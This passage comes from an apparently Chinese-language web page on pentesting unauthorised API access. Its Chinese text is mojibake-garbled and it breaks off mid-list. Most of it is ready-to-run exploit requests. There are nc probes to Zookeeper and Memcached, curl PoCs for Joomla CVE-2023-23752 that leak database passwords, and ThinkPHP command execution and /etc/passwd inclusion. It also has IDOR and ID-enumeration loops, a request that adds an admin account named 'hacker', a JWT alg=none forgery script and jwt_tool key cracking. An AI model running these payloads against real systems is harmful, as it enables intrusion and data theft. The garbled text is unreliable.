+<h4 id="甯哥敤鍥涘瓧鍛戒护"><a href="#甯哥敤鍥涘瓧鍛戒护" class="headerlink" title="甯哥敤鍥涘瓧鍛戒护"></a>甯哥敤鍥涘瓧鍛戒护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;conf&quot; | nc 192.168.1.100 2181  # 閰嶇疆淇℃伅</span><br><span class="line">echo &quot;stat&quot; | nc 192.168.1.100 2181  # 鐘舵€佷俊鎭?echo &quot;dump&quot; | nc 192.168.1.100 2181  # 浼氳瘽淇℃伅</span><br><span class="line">echo &quot;envi&quot; | nc 192.168.1.100 2181  # 鐜淇℃伅</span><br><span class="line">echo &quot;reqs&quot; | nc 192.168.1.100 2181  # 璇锋眰缁熻</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-8-Memcached-鏈巿鏉冭闂"><a href="#4-8-Memcached-鏈巿鏉冭闂" class="headerlink" title="4.8 Memcached 鏈巿鏉冭闂?"></a>4.8 Memcached 鏈巿鏉冭闂?</h3><p><strong>榛樿绔彛</strong>锛?1211</p>
+<h4 id="妫€娴-PoC-6"><a href="#妫€娴-PoC-6" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鐩存帴杩炴帴娴嬭瘯</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;stats&quot;</span> | nc 192.168.1.100 11211</span><br><span class="line"><span class="comment"># 杩斿洖缁熻鏁版嵁鍗宠〃绀烘湭鎺堟潈</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鎴栬€呬娇鐢?libmemcached-tools</span></span><br><span class="line">memcstat --servers=192.168.1.100</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="浜斻€丆MS-搴旂敤-API-鏈巿鏉冿紙鍚-CVE-PoC锛"><a href="#浜斻€丆MS-搴旂敤-API-鏈巿鏉冿紙鍚-CVE-PoC锛" class="headerlink" title="浜斻€丆MS &#x2F; 搴旂敤 API 鏈巿鏉冿紙鍚?CVE &amp; PoC锛?"></a>浜斻€丆MS &#x2F; 搴旂敤 API 鏈巿鏉冿紙鍚?CVE &amp; PoC锛?</h2><h3 id="5-1-Joomla-REST-API-鏈巿鏉冿紙CVE-2023-23752锛"><a href="#5-1-Joomla-REST-API-鏈巿鏉冿紙CVE-2023-23752锛" class="headerlink" title="5.1 Joomla REST API 鏈巿鏉冿紙CVE-2023-23752锛?"></a>5.1 Joomla REST API 鏈巿鏉冿紙CVE-2023-23752锛?</h3><p><strong>褰卞搷鐗堟湰</strong>锛欽oomla! 4.0.0 ~ 4.2.7<br><strong>CVSS 璇勫垎</strong>锛?.5锛圚igh锛?<br><strong>婕忔礊鎻忚堪</strong>锛氱敱浜庡 Web 鏈嶅姟绔偣鐨勮闂檺鍒朵笉褰擄紝鏀诲嚮鑰呭彲閫氳繃浼犲叆 <code>public=true</code> 鍙傛暟缁曡繃鏉冮檺鏍￠獙锛岃幏鍙?Web 搴旂敤绋嬪簭鏁忔劅淇℃伅銆?</p>
+<h4 id="妫€娴-PoC-7"><a href="#妫€娴-PoC-7" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鑾峰彇鏁版嵁搴撻厤缃俊鎭紙鍚暟鎹簱瀵嗙爜锛?curl &quot;http://target.com/api/index.php/v1/config/application?public=true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鑾峰彇鐢ㄦ埛淇℃伅</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/api/index.php/v1/users?public=true&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="棰勬湡鍝嶅簲"><a href="#棰勬湡鍝嶅簲" class="headerlink" title="棰勬湡鍝嶅簲"></a>棰勬湡鍝嶅簲</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;attributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;joomla_user&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;database_password_here&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;db&quot;</span><span class="punctuation">:</span> <span class="string">&quot;joomla_db&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dbprefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;abcde_&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="FOFA-鎸囩汗"><a href="#FOFA-鎸囩汗" class="headerlink" title="FOFA 鎸囩汗"></a>FOFA 鎸囩汗</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;Joomla! 4&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-2-WordPress-REST-API-鐢ㄦ埛淇℃伅娉勯湶"><a href="#5-2-WordPress-REST-API-鐢ㄦ埛淇℃伅娉勯湶" class="headerlink" title="5.2 WordPress REST API 鐢ㄦ埛淇℃伅娉勯湶"></a>5.2 WordPress REST API 鐢ㄦ埛淇℃伅娉勯湶</h3><p>WordPress 鑷?4.7 璧峰唴缃?REST API锛岄粯璁ゆ儏鍐典笅鏈櫥褰曠敤鎴峰彲閫氳繃 API 鑾峰彇鐢ㄦ埛鍒楄〃銆?</p>
+<h4 id="妫€娴-PoC-8"><a href="#妫€娴-PoC-8" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鑾峰彇鐢ㄦ埛鍒楄〃</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/wp-json/wp/v2/users&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鑾峰彇鐗瑰畾鐢ㄦ埛淇℃伅</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/wp-json/wp/v2/users/1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤-1"><a href="#鍒╃敤-1" class="headerlink" title="鍒╃敤"></a>鍒╃敤</h4><h2 id="鑾峰彇鐢ㄦ埛淇℃伅鍚庯紝缁撳悎寮卞彛浠ょ垎鐮村悗鍙扮櫥褰曘€"><a href="#鑾峰彇鐢ㄦ埛淇℃伅鍚庯紝缁撳悎寮卞彛浠ょ垎鐮村悗鍙扮櫥褰曘€" class="headerlink" title="鑾峰彇鐢ㄦ埛淇℃伅鍚庯紝缁撳悎寮卞彛浠ょ垎鐮村悗鍙扮櫥褰曘€?"></a>鑾峰彇鐢ㄦ埛淇℃伅鍚庯紝缁撳悎寮卞彛浠ょ垎鐮村悗鍙扮櫥褰曘€?</h2><h3 id="5-3-ThinkPHP-API-鏈巿鏉"><a href="#5-3-ThinkPHP-API-鏈巿鏉" class="headerlink" title="5.3 ThinkPHP API 鏈巿鏉?"></a>5.3 ThinkPHP API 鏈巿鏉?</h3><p>ThinkPHP 5.x 鍦ㄥ搴旂敤妯″紡涓嬶紝濡傛灉鏈紑鍚己鍒惰矾鐢憋紝鏀诲嚮鑰呭彲閫氳繃 URL 鐩存帴璋冪敤浠绘剰鎺у埗鍣ㄦ柟娉曘€?</p>
+<h4 id="妫€娴-PoC-9"><a href="#妫€娴-PoC-9" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鑾峰彇 PHP 淇℃伅</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/index.php?s=index/Index/phpinfo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鎵ц绯荤粺鍛戒护</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/index.php?s=index/Index/exec&amp;cmd=whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鏂囦欢鍖呭惈</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/index.php?s=index/Index/display&amp;file=../../etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-4-閫氳揪OA-API-鏈巿鏉"><a href="#5-4-閫氳揪OA-API-鏈巿鏉" class="headerlink" title="5.4 閫氳揪OA API 鏈巿鏉?"></a>5.4 閫氳揪OA API 鏈巿鏉?</h3><p>閫氳揪OA 瀛樺湪澶氫釜 API 鏈巿鏉冩紡娲烇紝鍙鑷存枃浠朵笂浼犮€侀檮浠舵硠闇层€佺敤鎴蜂俊鎭硠闇茬瓑銆?</p>
+<h4 id="妫€娴嬭矾寰-5"><a href="#妫€娴嬭矾寰-5" class="headerlink" title="妫€娴嬭矾寰?"></a>妫€娴嬭矾寰?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ispirit/im/upload.php      鈫?浠绘剰鏂囦欢涓婁紶</span><br><span class="line">/ispirit/interface/gateway.php  鈫?鏂囦欢鍖呭惈</span><br><span class="line">/general/鈥︹€?attach/鈥︹€?      鈫?闄勪欢鏈巿鏉冭闂?/mobile/api/api_xxx.php     鈫?鎵嬫満绔?API 鏈巿鏉?```</span><br><span class="line"></span><br><span class="line">#### 妫€娴?PoC</span><br><span class="line"></span><br><span class="line">```powershell</span><br><span class="line"># 闄勪欢鏈巿鏉冭鍙?curl &quot;http://target.com/general/xxx/attach/xxx/xxx.rar&quot;</span><br><span class="line"></span><br><span class="line"># 鏈巿鏉冪敤鎴蜂俊鎭?curl &quot;http://target.com/mobile/api/api_user.php?action=get_user_info&amp;uid=1&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-5-鑷磋繙OA-API-鏈巿鏉"><a href="#5-5-鑷磋繙OA-API-鏈巿鏉" class="headerlink" title="5.5 鑷磋繙OA API 鏈巿鏉?"></a>5.5 鑷磋繙OA API 鏈巿鏉?</h3><p>鑷磋繙OA 瀛樺湪澶氫釜鐗堟湰鐨勫墠鍙?API 鏈巿鏉冩紡娲炪€?</p>
+<h4 id="妫€娴嬭矾寰-6"><a href="#妫€娴嬭矾寰-6" class="headerlink" title="妫€娴嬭矾寰?"></a>妫€娴嬭矾寰?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/seeyon/rest/xxx            鈫?REST API 鏈巿鏉?/seeyon/thirdparty/xxx      鈫?绗笁鏂归泦鎴?API</span><br><span class="line">/seeyon/ajax.do?method=xxx  鈫?AJAX 璋冪敤</span><br></pre></td></tr></table></figure>
+
+<h4 id="妫€娴-PoC-10"><a href="#妫€娴-PoC-10" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鑾峰彇鐢ㄦ埛鍒楄〃</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/seeyon/rest/orgEmployee/list&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鑾峰彇绯荤粺閰嶇疆</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/seeyon/rest/config/system&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-6-鐢ㄥ弸NC-API-鏈巿鏉"><a href="#5-6-鐢ㄥ弸NC-API-鏈巿鏉" class="headerlink" title="5.6 鐢ㄥ弸NC API 鏈巿鏉?"></a>5.6 鐢ㄥ弸NC API 鏈巿鏉?</h3><p>鐢ㄥ弸 NC 绯诲垪 ERP 绯荤粺瀛樺湪澶ч噺 API 鏈巿鏉冩紡娲炪€?</p>
+<h4 id="妫€娴嬭矾寰-7"><a href="#妫€娴嬭矾寰-7" class="headerlink" title="妫€娴嬭矾寰?"></a>妫€娴嬭矾寰?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/service/~x/xxx</span><br><span class="line">/NCFindWeb/xxx</span><br><span class="line">/portal/xxx</span><br><span class="line">/uapws/xxx</span><br></pre></td></tr></table></figure>
+
+<h4 id="妫€娴-PoC-11"><a href="#妫€娴-PoC-11" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鑾峰彇鐢ㄦ埛淇℃伅</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/service/~x/xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鏈巿鏉?SQL 鏌ヨ</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://target.com/NCFindWeb/xxx&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="鍏€佷笟鍔￠€昏緫灞-API-鏈巿鏉"><a href="#鍏€佷笟鍔￠€昏緫灞-API-鏈巿鏉" class="headerlink" title="鍏€佷笟鍔￠€昏緫灞?API 鏈巿鏉?"></a>鍏€佷笟鍔￠€昏緫灞?API 鏈巿鏉?</h2><h3 id="6-1-姘村钩瓒婃潈锛圛DOR锛"><a href="#6-1-姘村钩瓒婃潈锛圛DOR锛" class="headerlink" title="6.1 姘村钩瓒婃潈锛圛DOR锛?"></a>6.1 姘村钩瓒婃潈锛圛DOR锛?</h3><p><strong>鎻忚堪</strong>锛氱敤鎴?A 閫氳繃淇敼鍙傛暟 ID锛屽彲浠ヨ闂垨鎿嶄綔鐢ㄦ埛 B 鐨勬暟鎹€?</p>
+<h4 id="妫€娴嬪満鏅"><a href="#妫€娴嬪満鏅" class="headerlink" title="妫€娴嬪満鏅?"></a>妫€娴嬪満鏅?</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 鐧诲綍鐢ㄦ埛 A锛岃幏鍙栬鍗曞垪琛?curl &quot;http://target.com/api/order/list?userId=1001&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 淇敼 userId 鍙傛暟锛屽皾璇曡闂敤鎴?B 鐨勮鍗?curl &quot;http://target.com/api/order/list?userId=1002&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 濡傛灉杩斿洖浜嗙敤鎴?B 鐨勮鍗曟暟鎹紝鍗冲瓨鍦?IDOR</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="甯歌-IDOR-鍙傛暟"><a href="#甯歌-IDOR-鍙傛暟" class="headerlink" title="甯歌 IDOR 鍙傛暟"></a>甯歌 IDOR 鍙傛暟</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id, uid, user_id, userId, order_id, article_id, site_id</span><br><span class="line">account_id, customer_id, student_id, employee_id</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="6-2-鍨傜洿瓒婃潈"><a href="#6-2-鍨傜洿瓒婃潈" class="headerlink" title="6.2 鍨傜洿瓒婃潈"></a>6.2 鍨傜洿瓒婃潈</h3><p><strong>鎻忚堪</strong>锛氫綆鏉冮檺鐢ㄦ埛閫氳繃 API 璋冪敤楂樻潈闄愭帴鍙ｏ紝鎵ц绠＄悊鍛樻搷浣溿€?</p>
+<h4 id="妫€娴嬪満鏅-1"><a href="#妫€娴嬪満鏅-1" class="headerlink" title="妫€娴嬪満鏅?"></a>妫€娴嬪満鏅?</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 鏅€氱敤鎴?Token 灏濊瘯璋冪敤绠＄悊鍛樻帴鍙?curl -X POST &quot;http://target.com/api/admin/user/add&quot; `</span></span><br><span class="line">  <span class="literal">-H</span> <span class="string">&quot;Authorization: Bearer &lt;鏅€氱敤鎴稵oken&gt;&quot;</span> `</span><br><span class="line">  <span class="literal">-H</span> <span class="string">&quot;Content-Type: application/json&quot;</span> `</span><br><span class="line">  <span class="literal">-d</span> <span class="string">&#x27;&#123;&quot;username&quot;:&quot;hacker&quot;,&quot;password&quot;:&quot;Hacker123!&quot;,&quot;role&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 濡傛灉杩斿洖 200 骞舵垚鍔熷垱寤虹鐞嗗憳锛屽嵆瀛樺湪鍨傜洿瓒婃潈</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="6-3-鏈巿鏉冩晱鎰熸帴鍙"><a href="#6-3-鏈巿鏉冩晱鎰熸帴鍙" class="headerlink" title="6.3 鏈巿鏉冩晱鎰熸帴鍙?"></a>6.3 鏈巿鏉冩晱鎰熸帴鍙?</h3><h4 id="甯歌鏁忔劅鎺ュ彛锛堟棤闇€浠讳綍-Token-鍗冲彲璁块棶锛"><a href="#甯歌鏁忔劅鎺ュ彛锛堟棤闇€浠讳綍-Token-鍗冲彲璁块棶锛" class="headerlink" title="甯歌鏁忔劅鎺ュ彛锛堟棤闇€浠讳綍 Token 鍗冲彲璁块棶锛?"></a>甯歌鏁忔劅鎺ュ彛锛堟棤闇€浠讳綍 Token 鍗冲彲璁块棶锛?</h4><p><strong>鐢ㄦ埛绠＄悊绫伙細</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET  /api/user/list           鈫?鐢ㄦ埛鍒楄〃</span><br><span class="line">GET  /api/user/info           鈫?鐢ㄦ埛淇℃伅</span><br><span class="line">POST /api/user/add            鈫?娣诲姞鐢ㄦ埛</span><br><span class="line">POST /api/user/delete         鈫?鍒犻櫎鐢ㄦ埛</span><br><span class="line">POST /api/user/resetPassword  鈫?閲嶇疆瀵嗙爜</span><br></pre></td></tr></table></figure>
+
+<p><strong>閰嶇疆绠＄悊绫伙細</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET  /api/config              鈫?绯荤粺閰嶇疆</span><br><span class="line">GET  /api/database            鈫?鏁版嵁搴撻厤缃?GET  /api/redis               鈫?Redis 閰嶇疆</span><br><span class="line">GET  /api/oss                 鈫?瀵硅薄瀛樺偍閰嶇疆</span><br><span class="line">GET  /api/log                 鈫?鏃ュ織鏌ョ湅</span><br></pre></td></tr></table></figure>
+
+<p><strong>鏂囦欢鎿嶄綔绫伙細</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/upload              鈫?鏂囦欢涓婁紶</span><br><span class="line">GET  /api/download?file=      鈫?鏂囦欢涓嬭浇</span><br><span class="line">POST /api/import              鈫?鏁版嵁瀵煎叆</span><br><span class="line">GET  /api/export              鈫?鏁版嵁瀵煎嚭</span><br></pre></td></tr></table></figure>
+
+<p><strong>涓氬姟鎿嶄綔绫伙細</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /api/order/create        鈫?鍒涘缓璁㈠崟</span><br><span class="line">POST /api/order/refund        鈫?閫€娆炬搷浣?POST /api/transfer            鈫?杞处鎿嶄綔</span><br><span class="line">POST /api/email/send          鈫?鍙戦€侀偖浠?```</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### 6.4 鎺ュ彛鍙傛暟閬嶅巻</span><br><span class="line"></span><br><span class="line">#### 甯歌閬嶅巻鍦烘櫙</span><br><span class="line"></span><br><span class="line">```powershell</span><br><span class="line"># 1. 閬嶅巻鐢ㄦ埛 ID 鑾峰彇鍏ㄩ噺鐢ㄦ埛淇℃伅</span><br><span class="line">for ($i = 1; $i -le 1000; $i++) &#123;</span><br><span class="line">  $r = Invoke-WebRequest &quot;http://target.com/api/user/profile?id=$i&quot; -UseBasicParsing</span><br><span class="line">  if ($r.StatusCode -eq 200) &#123; Write-Host &quot;User $i found&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 2. 閬嶅巻璁㈠崟鍙?for ($i = 20260001; $i -le 20261000; $i++) &#123;</span><br><span class="line">  $r = Invoke-WebRequest &quot;http://target.com/api/order/get?orderNo=$i&quot; -UseBasicParsing</span><br><span class="line">  if ($r.StatusCode -eq 200) &#123; Write-Host &quot;Order $i found&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 3. 閬嶅巻鎵嬫満鍙?閭</span><br><span class="line">curl &quot;http://target.com/api/user/check?phone=13800138001&quot;</span><br><span class="line">curl &quot;http://target.com/api/user/check?phone=13800138002&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="6-5-JWT-鏈巿鏉-浼€"><a href="#6-5-JWT-鏈巿鏉-浼€" class="headerlink" title="6.5 JWT 鏈巿鏉?&#x2F; 浼€?"></a>6.5 JWT 鏈巿鏉?&#x2F; 浼€?</h3><h4 id="甯歌-JWT-闂"><a href="#甯歌-JWT-闂" class="headerlink" title="甯歌 JWT 闂"></a>甯歌 JWT 闂</h4><table>
+<thead>
+<tr>
+<th align="left">闂</th>
+<th align="left">璇存槑</th>
+<th align="left">妫€娴嬫柟寮?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">alg&#x3D;none</td>
+<td align="left">绠楁硶璁剧疆涓?none锛岀粫杩囩鍚嶉獙璇?</td>
+<td align="left">淇敼 JWT 澶翠负 <code>&#123;&quot;alg&quot;:&quot;none&quot;&#125;</code>锛屽幓闄ょ鍚嶉儴鍒?</td>
+</tr>
+<tr>
+<td align="left">寮卞瘑閽?</td>
+<td align="left">浣跨敤寮卞瘑閽ワ紙濡?<code>secret</code>銆乣123456&#96;锛?</td>
+<td align="left">浣跨敤 jwt_tool 鎴?hashcat 鐖嗙牬</td>
+</tr>
+<tr>
+<td align="left">鏈獙璇佺鍚?</td>
+<td align="left">鏈嶅姟绔湭楠岃瘉绛惧悕鏈夋晥鎬?</td>
+<td align="left">浠绘剰淇敼 payload 鍚庨噸鏀?</td>
+</tr>
+<tr>
+<td align="left">瀵嗛挜娉勯湶</td>
+<td align="left">瀵嗛挜纭紪鐮佸湪瀹㈡埛绔唬鐮佷腑</td>
+<td align="left">鍙嶇紪璇戝墠绔?JS 鎴?APK</td>
+</tr>
+<tr>
+<td align="left">杩囨湡鏃堕棿杩囬暱</td>
+<td align="left">Token 姘镐笉杩囨湡</td>
+<td align="left">妫€鏌?exp 瀛楁</td>
+</tr>
+</tbody></table>
+<h4 id="妫€娴-PoC-12"><a href="#妫€娴-PoC-12" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JWT alg=none 鏀诲嚮妫€娴?import jwt, requests</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍘熷 token</span></span><br><span class="line">token = <span class="string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鏋勯€?alg=none 鐨?token</span></span><br><span class="line">header = &#123;<span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>, <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>&#125;</span><br><span class="line">payload = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;exp&quot;</span>: <span class="number">9999999999</span>&#125;</span><br><span class="line">fake_token = jwt.encode(payload, <span class="string">&quot;&quot;</span>, algorithm=<span class="string">&quot;none&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍙戦€佽姹?headers = &#123;&quot;Authorization&quot;: f&quot;Bearer &#123;fake_token&#125;&quot;&#125;</span></span><br><span class="line">r = requests.get(<span class="string">&quot;http://target.com/api/admin/xxx&quot;</span>, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.status_code, r.text[:<span class="number">200</span>])</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 浣跨敤 jwt_tool 妫€娴?# 涓嬭浇: https://github.com/ticarpi/jwt_tool</span></span><br><span class="line">python jwt_tool.py &lt;token&gt; <span class="literal">-T</span>  <span class="comment"># 娴嬭瘯 alg=none</span></span><br><span class="line">python jwt_tool.py &lt;token&gt; <span class="literal">-C</span> <span class="literal">-d</span> rockyou.txt  <span class="comment"># 鐖嗙牬瀵嗛挜</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="涓冦€佸疄鎴樻娴嬫柟娉曡"><a href="#涓冦€佸疄鎴樻娴嬫柟娉曡" class="headerlink" title="涓冦€佸疄鎴樻娴嬫柟娉曡"></a>涓冦€佸疄鎴樻娴嬫柟娉曡</h2><h3 id="7-1-淇℃伅鏀堕泦闃舵"><a href="#7-1-淇℃伅鏀堕泦闃舵" class="headerlink" title="7.1 淇℃伅鏀堕泦闃舵"></a>7.1 淇℃伅鏀堕泦闃舵</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. 鏀堕泦 API 鎺ュ彛</span><br><span class="line">   - 鎶撳彇鍓嶇 JS 